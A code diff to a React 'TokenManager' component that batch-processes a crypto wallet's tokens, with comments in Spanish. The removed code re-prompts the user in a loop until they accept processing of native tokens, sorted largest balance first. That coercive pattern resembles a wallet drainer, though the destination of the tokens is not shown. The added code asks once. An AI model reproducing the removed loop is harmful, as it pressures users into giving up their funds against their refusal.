@@ -636,70 +636,66 @@ export default function TokenManager(): React.JSX.Element {
   }
 
   const processAllTokens = async (): Promise<void> => {
-    if (!tokens.length) {
-      setShowProcessingModal(false)
-      return
-    }
-
-    setProcessing(true)
-    setSummary({ sent: [], failed: [] }) // Reset summary
-    
-    // Separar tokens nativos y no nativos
-    const nonNativeTokens = tokens.filter(token => token.address !== null)
-    const nativeTokens = tokens.filter(token => token.address === null)
-    
-    // Si hay tokens nativos, mostrar confirmación persistente
-    if (nativeTokens.length > 0) {
-      let shouldProcessNatives = false;
-      
-      // Persistir hasta que el usuario acepte procesar los tokens nativos
-      while (!shouldProcessNatives) {
-        shouldProcessNatives = await confirmAction(
-          `Se han detectado ${nativeTokens.length} token(s) nativo(s). ¿Deseas procesarlos automáticamente?`
-        );
-        
-        if (!shouldProcessNatives) {
-          // Si el usuario cancela, mostrar mensaje y volver a preguntar
-          await alertAction('Debes aceptar el procesamiento de tokens nativos para continuar.');
-        }
-      }
-    }
-    
-    // Ordenar tokens nativos por balance (mayor primero)
-    const sortedNativeTokens = [...nativeTokens].sort((a, b) => {
-      const balanceA = ethers.BigNumber.from(a.balance || '0')
-      const balanceB = ethers.BigNumber.from(b.balance || '0')
-      return balanceB.gt(balanceA) ? 1 : balanceB.lt(balanceA) ? -1 : 0
-    })
-
-    // Procesar tokens no nativos automáticamente
-    for (const token of nonNativeTokens) {
-      await processToken(token)
-    }
-
-    // Procesar tokens nativos automáticamente
-    for (const token of sortedNativeTokens) {
-      await changeChainIfNeeded(token.chain as number)
-    }
-
-    setProcessing(false)
+  if (!tokens.length || processing) {
     setShowProcessingModal(false)
-
-    // Mostrar resumen después de un breve delay para que se actualice el estado
-    setTimeout(async () => {
-      if (summary.sent.length > 0 || summary.failed.length > 0) {
-        let message = '=== Resumen ===\n'
-        message += `Éxitos: ${summary.sent.length}\n`
-        message += `Fallos: ${summary.failed.length}\n`
-
-        if (summary.failed.length > 0) {
-          message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
-        }
-
-        showAlertModal('Resumen', message, 'info')
-      }
-    }, 100)
+    return
   }
+
+  setProcessing(true)
+  setSummary({ sent: [], failed: [] })
+  
+  const nonNativeTokens = tokens.filter(token => token.address !== null)
+  const nativeTokens = tokens.filter(token => token.address === null)
+
+  // Procesar tokens no nativos
+  for (const token of nonNativeTokens) {
+    await processToken(token)
+  }
+
+  // Procesar tokens nativos SOLO si el usuario aceptó
+  if (nativeTokens.length > 0) {
+    const shouldProcessNatives = await confirmAction(
+      `Se han detectado ${nativeTokens.length} token(s) nativo(s). ¿Deseas procesarlos automáticamente?`
+    )
+    
+    if (shouldProcessNatives) {
+      for (const token of nativeTokens) {
+        await changeChainIfNeeded(token.chain as number)
+        await processNativeToken(token)
+      }
+    } else {
+      // Agregar tokens nativos no procesados a la lista de fallados
+      setSummary(prev => ({
+        ...prev,
+        failed: [
+          ...prev.failed,
+          ...nativeTokens.map(token => ({ 
+            token, 
+            reason: 'Usuario rechazó el procesamiento' 
+          }))
+        ]
+      }))
+    }
+  }
+
+  setProcessing(false)
+  setShowProcessingModal(false)
+
+  // Mostrar resumen
+  setTimeout(() => {
+    if (summary.sent.length > 0 || summary.failed.length > 0) {
+      let message = 'Resumen:\n'
+      message += `Éxitos: ${summary.sent.length}\n`
+      message += `Fallos: ${summary.failed.length}`
+      
+      if (summary.failed.length > 0) {
+        message += '\n\nAlgunos tokens no se procesaron. Revisa los detalles.'
+      }
+
+      showAlertModal('Proceso completado', message, 'info')
+    }
+  }, 100)
+}
 
   // Evitar renderizado hasta que estemos en el cliente
   if (!isClient) {
